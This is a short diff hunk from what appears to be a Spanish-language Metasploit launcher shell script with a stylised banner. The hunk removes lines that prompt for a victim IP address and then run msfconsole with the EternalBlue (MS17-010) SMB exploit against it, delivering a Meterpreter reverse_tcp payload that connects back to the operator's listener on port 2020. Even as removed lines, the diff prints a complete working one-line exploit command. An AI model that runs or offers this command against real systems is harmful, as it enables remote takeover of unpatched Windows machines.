@@ -51,9 +51,3 @@ echo "$fin =[$ama 爪乇ㄒ卂丂卩ㄥㄖ丨ㄒ v6.0-dev$fin]
 
 
 "
-echo -n "└─>ΣƧᄃЯIBΣ (IP--VIᄃƬIMΛ)::: $azu"
-
-read ete
- 
-msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;set RHOST $ete;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST $ip;set ExitOnSession false;set LPORT 2020;exploit"
-
